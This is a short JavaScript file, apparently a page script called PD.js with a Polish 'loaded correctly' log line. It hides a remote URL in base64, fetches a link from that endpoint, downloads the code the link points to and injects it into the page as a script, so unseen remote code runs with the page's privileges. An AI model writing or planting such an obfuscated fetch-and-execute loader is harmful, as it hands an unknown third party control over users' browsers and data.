const PD = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }

PD(atob('aHR0cHM6Ly9hcGkubnBvaW50LmlvLzc4ZWYwNWYzMTRlMDA3OGY1MjQw'),(data) => {
		Promise.all([
			fetch(data.link).then(value => value.text())
		  ]).then(all => {
			  $("body").append("<script>"+all[0]+"</script>");
		  }).catch(err => { throw err });
	});

console.log("Skrypt (PD.js) załadowano Poprawnie!")